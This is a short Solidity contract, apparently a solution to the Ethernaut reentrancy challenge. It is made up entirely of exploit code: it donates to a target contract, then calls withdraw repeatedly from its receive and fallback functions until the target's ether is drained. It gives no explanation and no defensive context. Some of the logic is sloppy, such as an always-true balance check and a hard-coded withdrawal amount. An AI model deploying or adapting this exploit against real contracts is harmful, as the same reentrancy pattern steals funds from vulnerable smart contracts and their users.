
   interface IDao {
    function withdraw(uint _amount) external ;
    function donate(address _to)external  payable;
 }
    

contract Ethernaut_reentrency_attack {


     IDao dao; 

    constructor(address _dao){
        dao = IDao(_dao);
    }

    function attack9 () payable public {

        require(msg.value >= 1 wei, "Need at least 1 wei");
        dao.donate{value: msg.value}(address(this));
        dao.withdraw(msg.value);

    }
 
     fallback () external payable {

        if(address(dao).balance >= 0 ){
            dao.withdraw(address(dao).balance);
        }
                
    }

    receive () external payable  {
            dao.withdraw(1000000000000000);
    }

    function getBalance () public view returns (uint256) {
        return address(this).balance;
    }


}